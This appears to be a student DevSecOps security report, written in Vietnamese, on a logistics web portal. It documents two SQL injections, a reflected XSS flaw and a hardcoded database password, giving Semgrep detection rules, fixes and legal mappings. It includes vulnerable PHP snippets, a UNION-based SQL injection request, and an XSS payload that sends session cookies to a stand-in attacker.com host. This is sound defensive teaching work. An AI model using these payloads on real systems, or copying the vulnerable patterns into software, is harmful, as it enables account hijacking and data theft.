# BÁO CÁO PHÂN TÍCH LỖ HỔNG AN TOÀN BẢO MẬT
**Thành viên thực hiện:** Nguyễn Giang Nam  
**Vai trò trong dự án:** Trưởng nhóm — Kiến trúc sư DevSecOps (Lead Architect)  
**Phạm vi phụ trách:** Cổng thông tin công cộng, Quản lý quy chuẩn phân nhánh & Tra cứu cảng biển  
**Đề tài:** Hệ thống DevSecOps CI/CD kiểm định an ninh tự động cho InlaneWeb Logistics Portal  

---

## PHẦN A: TỔNG HỢP DANH MỤC 4 LỖ HỔNG AN TOÀN BẢO MẬT (SAST - SEMGREP / OWASP / CWE)

| STT | Tên Lỗ hổng | Loại lỗi | Mã CWE | Tệp tin & Vị trí vi phạm | Mức độ cảnh báo | Động cơ phát hiện |
| :---: | :--- | :---: | :---: | :--- | :---: | :---: |
| 1 | **In-band UNION SQL Injection** | Code | CWE-89 | `InlaneWeb/web/src/pages/ports.php:38` | 🔴 High / ERROR | Semgrep Taint Engine |
| 2 | **Reflected Cross-Site Scripting (XSS)** | Code | CWE-79 | `InlaneWeb/web/src/pages/ports.php:26` | 🔴 High / ERROR | Semgrep & SonarQube |
| 3 | **Numeric UNION SQL Injection** | Code | CWE-89 | `InlaneWeb/web/src/pages/news.php:17` | 🔴 High / ERROR | Semgrep Taint Engine |
| 4 | **Hardcoded Database Root Password** | Config | CWE-798 | `InlaneWeb/docker-compose.yml:17` | 🔴 High / ERROR | Semgrep Secrets Scan |

---

## CHI TIẾT TỪNG LỖ HỔNG BẢO MẬT

### 1. In-band UNION-based SQL Injection tại trang Tra cứu Cảng biển
* **Vị trí vi phạm:** [InlaneWeb/web/src/pages/ports.php:38](file:///d:/PTIT-DevOps-SonarQube/InlaneWeb/web/src/pages/ports.php#L38)
* **Phân loại lỗi:** Mã nguồn (Application Code) | **Pha DevSecOps:** Pha Test / SAST (Stage 2)
* **Mã định danh điểm yếu:** **CWE-89: SQL Injection** | **OWASP Top 10:2021:** A03:2021 — Injection
* **Quy tắc phát hiện:** Semgrep Rule `php.lang.security.injection.tainted-sql-string.tainted-sql-string`

#### a. Bằng chứng mã nguồn vi phạm (Vulnerable Code):
```php
// Source: Dữ liệu người dùng nhập từ tham số GET không qua kiểm soát
$q = $_GET['q'] ?? '';

// Sink: Nối chuỗi trực tiếp vào câu lệnh SQL
$sql = "SELECT code, city, country, volume FROM ports WHERE code LIKE '%$q%'";
echo '<div class="query-box">' . htmlspecialchars($sql) . '</div>';
$res = query($sql);
```

#### b. Cơ chế phát hiện & Trích xuất mã nguồn (Detection Mechanism):
* **Quy tắc Semgrep quét phát hiện (Rule Definition Code):**
```yaml
rules:
  - id: php.lang.security.injection.tainted-sql-string.tainted-sql-string
    languages: [php]
    severity: ERROR
    mode: taint
    pattern-sources:
      - pattern: $_GET[...]
      - pattern: $_POST[...]
    pattern-sinks:
      - pattern: query("...$X...", ...)
      - pattern: mysqli_query($CONN, "...$X...", ...)
    pattern-sanitizers:
      - pattern: $DB->prepare(...)
      - pattern: intval(...)
```

* **Cơ chế phân tích luồng ô nhiễm (Taint / AST Analysis):**
  - **Tệp tin & hàm xử lý:** Tự động phát hiện trong Stage 2 và trích xuất qua script [`ci/semgrep_report.py`](file:///d:/PTIT-DevOps-SonarQube/ci/semgrep_report.py) bằng hàm `extract_source_and_sink(path_str, line_no)`.
  - **🟡 SOURCE (Nguồn dữ liệu người dùng nhập / Khai báo cấu hình):**
```php
// Dòng 21 (InlaneWeb/web/src/pages/ports.php):
$q = $_GET['q'] ?? '';
```
  - **🔴 SINK (Điểm kích hoạt / Thực thi câu lệnh nguy hiểm):**
```php
// Dòng 38-41 (InlaneWeb/web/src/pages/ports.php):
$sql = "SELECT code, city, country, volume FROM ports WHERE code LIKE '%$q%'";
$res = query($sql);
```

#### c. Kịch bản khai thác thực tế (PoC):
Kẻ tấn công gửi tải trọng trích xuất tên cơ sở dữ liệu và phiên bản MariaDB:
```http
GET /ports?q=' UNION SELECT 1, @@version, user(), 4-- -
```
* **Hậu quả:** Kẻ tấn công trích xuất được toàn bộ tài khoản quản trị, mật khẩu băm và dữ liệu khách hàng trong CSDL.

#### d. Cách thức xử lý & Khắc phục (Remediation):
Chuyển đổi hoàn toàn sang **Prepared Statements tham số hóa**:
```php
// Mã nguồn sau khi vá an toàn:
$stmt = db()->prepare("SELECT code, city, country, volume FROM ports WHERE code LIKE ?");
$search_param = "%" . $q . "%";
$stmt->bind_param("s", $search_param);
$stmt->execute();
$res = $stmt->get_result();
```

#### e. Đánh giá Vi phạm Chính sách & Bài toán Security-as-Code (SaC):
* **Pha trong quy trình DevSecOps:** **Pha Test / SAST Gate (Stage 2 trong CI/CD Pipeline)**
  - *Đánh giá rủi ro:* Lỗi phát sinh trong quá trình code tính năng tra cứu cảng biển. Nếu không có chốt chặn SAST tại Stage 2, mã nguồn ô nhiễm sẽ vượt qua kiểm định, đóng gói vào image và đưa lên máy chủ sản xuất, tạo nguy cơ lộ lọt toàn bộ cơ sở dữ liệu cảng biển.
* **Căn cứ vi phạm chính sách pháp lý:**
  - **Nghị định 13/2023/NĐ-CP:** Điều 9 Khoản 2 & Điều 26 (Vi phạm nghĩa vụ áp dụng biện pháp kỹ thuật an toàn mạng, tạo lỗ hổng cho kẻ tấn công trích xuất trái phép CSDL khách hàng và hệ thống).
  - **GDPR (Châu Âu):** Article 32 — Security of Processing (Không bảo đảm tính toàn vẹn và tính bảo mật của hệ thống xử lý dữ liệu, để lộ bề mặt tấn công SQLi).
* **Hiện thực hóa Bài toán Security-as-Code (SaC):**
  - Mã hóa tiêu chuẩn bảo mật thành quy tắc chặn trong pipeline `.github/workflows/devsecops-pipeline.yml`. Khi Semgrep phát hiện rule `tainted-sql-string`, cờ `--error` lập tức kích hoạt cơ chế ngắt build (Break-the-Build), từ chối hợp nhất mã.
```yaml
# .github/workflows/devsecops-pipeline.yml (Stage 2: Semgrep Security SAST)
- name: Run Semgrep SAST
  run: |
    pipx run semgrep scan \
      --config "p/owasp-top-ten" \
      --config "ci/semgrep-local-rules.yml" \
      --error --json -o reports/semgrep/semgrep.json \
      InlaneWeb
```

---

### 2. Reflected Cross-Site Scripting (XSS) tại ô Tìm kiếm Cảng
* **Vị trí vi phạm:** [InlaneWeb/web/src/pages/ports.php:26](file:///d:/PTIT-DevOps-SonarQube/InlaneWeb/web/src/pages/ports.php#L26)
* **Phân loại lỗi:** Mã nguồn (Application Code) | **Pha DevSecOps:** Pha Test / SAST (Stage 2)
* **Mã định danh điểm yếu:** **CWE-79: Improper Neutralization of Input During Web Page Generation**
* **Quy tắc phát hiện:** Semgrep Rule `php.lang.security.injection.echoed-request.echoed-request` & SonarQube `php:S5131`

#### a. Bằng chứng mã nguồn vi phạm (Vulnerable Code):
```php
// In trực tiếp biến $q ra HTML response mà không qua htmlspecialchars
echo '<div class="search-summary">'
   . 'Kết quả tra cứu cho từ khóa: <strong>' . $q . '</strong>'
   . '</div>';
```

#### b. Cơ chế phát hiện & Trích xuất mã nguồn (Detection Mechanism):
* **Quy tắc Semgrep quét phát hiện (Rule Definition Code):**
```yaml
rules:
  - id: php.lang.security.injection.echoed-request.echoed-request
    languages: [php]
    severity: ERROR
    patterns:
      - pattern-either:
          - pattern: <input ... value="<?= $X ?>" ...>
          - pattern: echo ... $X ...;
      - pattern-not: htmlspecialchars(...)
      - pattern-not: htmlentities(...)
```

* **Cơ chế phân tích luồng ô nhiễm (Taint / AST Analysis):**
  - **Tệp tin & hàm xử lý:** Tự động phát hiện trong Stage 2 và trích xuất qua script [`ci/semgrep_report.py`](file:///d:/PTIT-DevOps-SonarQube/ci/semgrep_report.py) bằng hàm `extract_source_and_sink(path_str, line_no)`.
  - **🟡 SOURCE (Nguồn dữ liệu người dùng nhập / Khai báo cấu hình):**
```php
// Dòng 21 (InlaneWeb/web/src/pages/ports.php):
$q = $_GET['q'] ?? '';
```
  - **🔴 SINK (Điểm kích hoạt / Thực thi câu lệnh nguy hiểm):**
```php
// Dòng 26 (InlaneWeb/web/src/pages/ports.php):
<input type="text" name="q" value="<?= $q ?>" placeholder="Mã cảng hoặc tên thành phố...">
```

#### c. Kịch bản khai thác thực tế (PoC):
Kẻ tấn công lừa nạn nhân nhấn vào liên kết chứa mã script độc hại:
```http
GET /ports?q=<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
```
* **Hậu quả:** Trình duyệt của nạn nhân thực thi mã độc, gửi session cookie `PHPSESSID` về máy chủ kẻ tấn công, dẫn tới chiếm đoạt tài khoản người dùng (Session Hijacking).

#### d. Cách thức xử lý & Khắc phục (Remediation):
Mã hóa toàn bộ các ký tự nhạy cảm (`<`, `>`, `"`, `'`, `&`) trước khi render ra HTML:
```php
echo '<div class="search-summary">'
   . 'Kết quả tra cứu cho từ khóa: <strong>' . htmlspecialchars($q, ENT_QUOTES, 'UTF-8') . '</strong>'
   . '</div>';
```

#### e. Đánh giá Vi phạm Chính sách & Bài toán Security-as-Code (SaC):
* **Pha trong quy trình DevSecOps:** **Pha Test / SAST Gate (Stage 2 trong CI/CD Pipeline)**
  - *Đánh giá rủi ro:* Lỗi xảy ra trong pha lập trình giao diện tra cứu khi lập trình viên hiển thị từ khóa người dùng nhập. Việc thiếu bộ lọc HTML khiến kẻ tấn công có thể chèn mã độc JavaScript để đánh cắp phiên người dùng ngay trên trình duyệt.
* **Căn cứ vi phạm chính sách pháp lý:**
  - **Nghị định 13/2023/NĐ-CP:** Điều 13 Khoản 2 (Vi phạm quy định bảo vệ bí mật thông tin tài khoản và phiên đăng nhập của chủ thể dữ liệu).
  - **GDPR (Châu Âu):** Article 5(1)(f) — Integrity and Confidentiality (Xử lý dữ liệu không đảm bảo tính bảo mật thích hợp, tạo điều kiện cho mã độc phía client đánh cắp cookie session).
* **Hiện thực hóa Bài toán Security-as-Code (SaC):**
  - Bộ quy tắc phân tích cú pháp AST kiểm tra tự động chốt chặn thẻ echo thiếu hàm làm sạch thực thể HTML:
```yaml
# ci/semgrep-local-rules.yml / p/php: Kiểm tra xuất dữ liệu thô ra HTML
- id: php.lang.security.injection.echoed-request.echoed-request
  languages: [php]
  severity: ERROR
  patterns:
    - pattern: <input ... value="<?= $X ?>" ...>
    - pattern-not: htmlspecialchars(...)
```

---

### 3. Numeric In-band SQL Injection tại trang Tin tức
* **Vị trí vi phạm:** [InlaneWeb/web/src/pages/news.php:17](file:///d:/PTIT-DevOps-SonarQube/InlaneWeb/web/src/pages/news.php#L17)
* **Phân loại lỗi:** Mã nguồn (Application Code) | **Pha DevSecOps:** Pha Test / SAST (Stage 2)
* **Mã định danh điểm yếu:** **CWE-89: SQL Injection**
* **Quy tắc phát hiện:** Semgrep Rule `php.lang.security.injection.tainted-sql-string.tainted-sql-string`

#### a. Bằng chứng mã nguồn vi phạm (Vulnerable Code):
```php
$id = $_GET['id'] ?? '';
if ($id !== '') {
    // Biến $id dạng số không được bọc dấu nháy và không ép kiểu số nguyên
    $sql = "SELECT id, title, body FROM news WHERE id = $id";
    $res = query($sql);
}
```

#### b. Cơ chế phát hiện & Trích xuất mã nguồn (Detection Mechanism):
* **Quy tắc Semgrep quét phát hiện (Rule Definition Code):**
```yaml
rules:
  - id: php.lang.security.injection.tainted-sql-string.tainted-sql-string
    languages: [php]
    severity: ERROR
    mode: taint
    pattern-sources:
      - pattern: $_GET[...]
    pattern-sinks:
      - pattern: query("... WHERE id = $ID", ...)
    pattern-sanitizers:
      - pattern: filter_input(..., FILTER_VALIDATE_INT)
```

* **Cơ chế phân tích luồng ô nhiễm (Taint / AST Analysis):**
  - **Tệp tin & hàm xử lý:** Tự động phát hiện trong Stage 2 và trích xuất qua script [`ci/semgrep_report.py`](file:///d:/PTIT-DevOps-SonarQube/ci/semgrep_report.py) bằng hàm `extract_source_and_sink(path_str, line_no)`.
  - **🟡 SOURCE (Nguồn dữ liệu người dùng nhập / Khai báo cấu hình):**
```php
// Dòng 10 (InlaneWeb/web/src/pages/news.php):
$id = $_GET['id'] ?? '';
```
  - **🔴 SINK (Điểm kích hoạt / Thực thi câu lệnh nguy hiểm):**
```php
// Dòng 17-19 (InlaneWeb/web/src/pages/news.php):
$sql = "SELECT id, title, body FROM news WHERE id = $id";
$res = query($sql);
```

#### c. Cách thức xử lý & Khắc phục (Remediation):
```php
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
if ($id !== false && $id !== null) {
    $stmt = db()->prepare("SELECT id, title, body FROM news WHERE id = ?");
    $stmt->bind_param("i", $id);
    $stmt->execute();
    $res = $stmt->get_result();
}
```

#### e. Đánh giá Vi phạm Chính sách & Bài toán Security-as-Code (SaC):
* **Pha trong quy trình DevSecOps:** **Pha Test / SAST Gate (Stage 2 trong CI/CD Pipeline)**
  - *Đánh giá rủi ro:* Lỗi nằm ở module tin tức công cộng. Việc thiếu ép kiểu số nguyên tạo lỗ hổng cho phép kẻ tấn công không cần đăng nhập vẫn trích xuất được bảng thông tin tài khoản quản trị qua kênh tin tức.
* **Căn cứ vi phạm chính sách pháp lý:**
  - **Nghị định 13/2023/NĐ-CP:** Điều 9 Khoản 2 (Không bảo đảm an toàn dữ liệu, để lộ lọt thông tin tài khoản qua kênh tin tức công cộng).
  - **GDPR (Châu Âu):** Article 32 (Không triển khai biện pháp kỹ thuật kiểm định tham số đầu vào an toàn theo tiêu chuẩn bảo mật).
* **Hiện thực hóa Bài toán Security-as-Code (SaC):**
  - Động cơ Taint Engine theo dõi luồng ô nhiễm từ tham số URL số nguyên vào câu lệnh SQL, tự động dừng pipeline nếu thiếu hàm kiểm định:
```yaml
# Cơ chế SaC Taint Analysis bắt ép kiểu số nguyên
- id: php.lang.security.injection.tainted-sql-string.tainted-sql-string
  languages: [php]
  severity: ERROR
  mode: taint
  pattern-sources: [pattern: $_GET['id']]
  pattern-sinks: [pattern: query("... WHERE id = $ID", ...)]
  pattern-sanitizers: [pattern: filter_input(..., FILTER_VALIDATE_INT)]
```

---

### 4. Hardcoded Database Root Password trong Docker Compose
* **Vị trí vi phạm:** [InlaneWeb/docker-compose.yml:17](file:///d:/PTIT-DevOps-SonarQube/InlaneWeb/docker-compose.yml#L17)
* **Phân loại lỗi:** Cấu hình & Quản lý bí mật (Secrets Management) | **Pha DevSecOps:** Pha Plan / Code (Stage 1)
* **Mã định danh điểm yếu:** **CWE-798: Use of Hard-coded Credentials**
* **Quy tắc phát hiện:** Semgrep Rule `ci.compose-hardcoded-mysql-root-password`

#### a. Bằng chứng cấu hình vi phạm:
```yaml
services:
  db:
    image: inlaneweb-db:latest
    environment:
      MYSQL_ROOT_PASSWORD: password  # Lộ mật khẩu quản trị root MariaDB
```

#### b. Cơ chế phát hiện & Trích xuất mã nguồn (Detection Mechanism):
* **Quy tắc Semgrep quét phát hiện (Rule Definition Code):**
```yaml
rules:
  - id: compose-hardcoded-mysql-root-password
    languages: [yaml]
    severity: ERROR
    message: MYSQL_ROOT_PASSWORD is hardcoded in Compose. Supply it from a secret instead.
    patterns:
      - pattern: |
          MYSQL_ROOT_PASSWORD: $PASSWORD
      - metavariable-regex:
          metavariable: $PASSWORD
          regex: '^(?!["']?\${)[A-Za-z0-9_!@#.$-]+$'
    paths:
      include:
        - "**/docker-compose*.yml"
```

* **Cơ chế phân tích luồng ô nhiễm (Taint / AST Analysis):**
  - **Tệp tin & hàm xử lý:** Tự động phát hiện trong Stage 2 và trích xuất qua script [`ci/semgrep_report.py`](file:///d:/PTIT-DevOps-SonarQube/ci/semgrep_report.py) bằng hàm `extract_source_and_sink(path_str, line_no)`.
  - **🟡 SOURCE (Nguồn dữ liệu người dùng nhập / Khai báo cấu hình):**
```yaml
# InlaneWeb/docker-compose.yml: Khai báo mật khẩu trực tiếp trong Compose file
```
  - **🔴 SINK (Điểm kích hoạt / Thực thi câu lệnh nguy hiểm):**
```yaml
# Dòng 17 (InlaneWeb/docker-compose.yml):
MYSQL_ROOT_PASSWORD: password
```

#### c. Cách thức xử lý & Khắc phục (Remediation):
Triệt tiêu thông tin xác thực tĩnh, sử dụng tệp biến môi trường `.env` được bảo vệ hoặc Docker Secret:
```yaml
services:
  db:
    environment:
      MYSQL_ROOT_PASSWORD_FILE: /run/secrets/db_root_password
    secrets:
      - db_root_password

secrets:
  db_root_password:
    external: true
```

#### e. Đánh giá Vi phạm Chính sách & Bài toán Policy-as-Code (PaC):
* **Pha trong quy trình DevSecOps:** **Pha Plan / Code (Stage 1) & Pre-commit / SAST**
  - *Đánh giá rủi ro:* Lỗi cấu hình hạ tầng xảy ra ngay từ bước khởi tạo tệp tin khai báo triển khai Docker. Mật khẩu cố định nếu bị đẩy lên GitHub công khai sẽ tạo điểm xâm nhập trực tiếp vào hệ quản trị CSDL MariaDB.
* **Căn cứ vi phạm chính sách pháp lý:**
  - **Nghị định 13/2023/NĐ-CP:** Điều 13 Khoản 1 & Điều 26 (Vi phạm nguyên tắc bảo vệ dữ liệu cá nhân ngay từ khâu thiết kế - Privacy by Design khi lưu trữ thông tin xác thực ở dạng rõ).
  - **GDPR (Châu Âu):** Article 25 — Data Protection by Design & Article 32 (Sử dụng mật khẩu mặc định rõ ràng vi phạm yêu cầu thiết kế an toàn mặc định).
* **Hiện thực hóa Bài toán Policy-as-Code (PaC):**
  - Chính sách kiểm tra IaC tự động chặn mọi tệp Compose chứa mật khẩu dạng chuỗi cố định không qua biến môi trường:
```yaml
# ci/semgrep-local-rules.yml (Chính sách Policy-as-Code kiểm tra Compose)
- id: compose-hardcoded-mysql-root-password
  languages: [yaml]
  severity: ERROR
  patterns:
    - pattern: "MYSQL_ROOT_PASSWORD: $PASSWORD"
    - metavariable-regex:
        metavariable: $PASSWORD
        regex: '^(?!["']?\${)[A-Za-z0-9_!@#.$-]+$'
```

---

## PHẦN B: KIỂM ĐỊNH CHẤT LƯỢNG MÃ NGUỒN (SONARQUBE CODE QUALITY)

Trong mô hình DevSecOps hiện đại, bên cạnh các lỗ hổng an ninh mạng (Security Gate), dự án triển khai quy chuẩn kiểm soát kép **Dual-Gate (Security Gate + Quality Gate)**. Công cụ **SonarQube Scanner** được kích hoạt tại Stage 2 để kiểm tra toàn diện các chỉ số tin cậy (Reliability), khả năng bảo trì (Maintainability) và khả năng tiếp cận (Accessibility - WCAG 2.1). Bất kỳ lỗi thuộc nhóm **New Bugs** nào xuất hiện trên nhánh tính năng (`feature/*`) đều sẽ trực tiếp đánh rớt Quality Gate (**FAILED**) và kích hoạt cơ chế Break-the-Build.

### 1. Tổng quan Lỗi Chất lượng Mã nguồn Phụ trách

| Tiêu chí Thẩm định | Nội dung Chi tiết từ SonarQube Scanner |
| :--- | :--- |
| **Tên vấn đề Code Quality** | **Input Control Missing ID & Associated Accessible Label (Web Accessibility Bug)** |
| **Mã quy tắc vi phạm (Rule Key)** | [`Web:InputWithoutLabelCheck`](https://rules.sonarsource.com/html/RSPEC-InputWithoutLabelCheck) / `Web:S6853` |
| **Phân loại vấn đề (Issue Type)** | 🐞 **BUG** (Lỗi khiếm khuyết phần mềm ảnh hưởng chức năng & trợ năng) |
| **Mức độ nghiêm trọng (Severity)**| 🟠 **MAJOR** |
| **Tệp tin & Vị trí vi phạm** | [InlaneWeb/web/src/pages/ports.php:26](file:///d:/PTIT-DevOps-SonarQube/InlaneWeb/web/src/pages/ports.php#L26) |
| **Phạm vi tiêu chuẩn áp dụng** | **WCAG 2.1 Level A (Criteria 1.3.1, 4.1.2)** & **ISO/IEC 40500:2012** |
| **Trạng thái Quality Gate** | ❌ **FAILED** (Vi phạm điều kiện tiên quyết: `0 New Bugs on New Code`) |

### 2. Bằng chứng Mã nguồn Vi phạm (Non-compliant Code)
Tại trang Tra cứu Cảng biển (`InlaneWeb/web/src/pages/ports.php`), phần tử `<input>` phục vụ tìm kiếm được khai báo mà không có định danh `id` và không được liên kết với nhãn `<label>` trợ năng:

```html
<!-- Dòng 25-28 (InlaneWeb/web/src/pages/ports.php) - MÃ NGUỒN VI PHẠM -->
<form class="searchbar" action="/ports" method="get">
    <input type="text" name="q" value="<?= $q ?>" placeholder="Mã cảng hoặc tên thành phố...">
    <button class="btn" type="submit">Tra cứu</button>
</form>
```

### 3. Cơ chế Phân tích của SonarQube Web/HTML Analyzer
* **Động cơ phân tích DOM Tree:** Bộ phân tích `sonar-html-plugin` duyệt cây cú pháp trừu tượng (AST) của các tệp giao diện PHP/HTML.
* **Nguyên nhân phát hiện vi phạm:** Quy tắc `Web:InputWithoutLabelCheck` yêu cầu mọi phần tử nhập liệu (`<input>`, `<textarea>`, `<select>`) phải có một nhãn rõ ràng đại diện thông qua một trong các hình thức:
  1. Thẻ `<label for="element_id">` liên kết trực tiếp với thuộc tính `id` của input.
  2. Input được bọc trực tiếp bên trong thẻ `<label>`.
  3. Thuộc tính `aria-label` hoặc `aria-labelledby` được khai báo hợp lệ.
* **Hậu quả kỹ thuật:** Nếu thiếu nhãn, các phần mềm đọc màn hình (Screen Readers) cho người khuyết tật không thể xác định mục đích của ô nhập liệu, dẫn đến trải nghiệm người dùng kém và vi phạm pháp lý về quyền tiếp cận công nghệ thông tin.

### 4. Tác động tới Quality Gate trong Quy trình CI/CD
* **Chính sách Quality Gate (`ci/sonarqube-quality-gate.json`):**
  - Số lượng Lỗi mới (New Bugs): Yêu cầu `= 0`.
  - Mức độ tin cậy mã nguồn (Reliability Rating): Bắt buộc đạt `A`.
* **Kịch bản gãy vỡ (Break-the-Build):** Do SonarQube phân loại lỗi này là **BUG (Major)**, chỉ số New Bugs tăng từ `0` lên `1`, dẫn tới Quality Gate lập tức chuyển trạng thái sang ❌ **FAILED**. Script `ci/demo_runner.py` và workflow GitHub Actions sẽ từ chối việc hợp nhất mã nguồn vào nhánh chính.

### 5. Phương án Khắc phục Chuẩn hóa (Clean Code Refactoring)
Bổ sung thuộc tính `id="port-search-input"` cho trường nhập liệu, đồng thời thêm thẻ `<label for="port-search-input">` với lớp CSS `.sr-only` (Screen Reader Only) để đảm bảo tính mỹ thuật giao diện nhưng đầy đủ khả năng trợ năng:

```html
<!-- Dòng 25-29 (InlaneWeb/web/src/pages/ports.php) - MÃ NGUỒN ĐÃ KHẮC PHỤC -->
<form class="searchbar" action="/ports" method="get">
    <label for="port-search-input" class="sr-only">Từ khóa tra cứu cảng biển:</label>
    <input id="port-search-input" type="text" name="q" value="<?= htmlspecialchars($q, ENT_QUOTES, 'UTF-8') ?>" placeholder="Mã cảng hoặc tên thành phố...">
    <button class="btn" type="submit">Tra cứu</button>
</form>
```

### 6. Kết quả Thẩm định Sau Khắc phục (Quality Gate Passed)

| Chỉ số Chất lượng (Metrics) | Trước khi Sửa (Dirty State) | Sau khi Sửa (Clean Code State) | Trạng thái Thẩm định |
| :--- | :---: | :---: | :---: |
| **New Bugs** | `1` (Major) | `0` | ✅ Đạt chuẩn (Thỏa mãn = 0) |
| **Reliability Rating** | `C` | `A` | ✅ Đạt chuẩn Tuyệt đối |
| **SonarQube Quality Gate** | ❌ **FAILED** | 🟢 **PASSED** | ✅ Cho phép Merge Pull Request |

---

## BÀI TOÁN SECURITY-AS-CODE (SaC) TRONG QUY TRÌNH DEVSECOPS

Với vai trò Trưởng nhóm và Kiến trúc sư DevSecOps, Nguyễn Giang Nam đã thiết lập cơ chế **Security-as-Code** tự động tại **Stage 2 (Automated SAST & Secret Scanning)** trong tệp `.github/workflows/ci.yml`:
* **Tự động hóa quét mã tĩnh:** Tích hợp Semgrep OSS CLI với bộ luật tùy chỉnh (`ci/semgrep-rules.yml`) để nhận diện ngay các lỗ hổng Taint Injection (SQLi, XSS) và Secret rò rỉ trong file Compose.
* **Nguyên tắc "Shift-Left" & Tự động ngắt Pipeline (Break-the-Build):** Nếu phát hiện bất kỳ lỗi nào thuộc mức `ERROR` (như CWE-89, CWE-79, CWE-798), quy trình CI sẽ lập tức dừng thực thi, ngăn chặn việc đóng gói Docker image hoặc đẩy mã nguồn nguy hiểm lên môi trường phân phối.
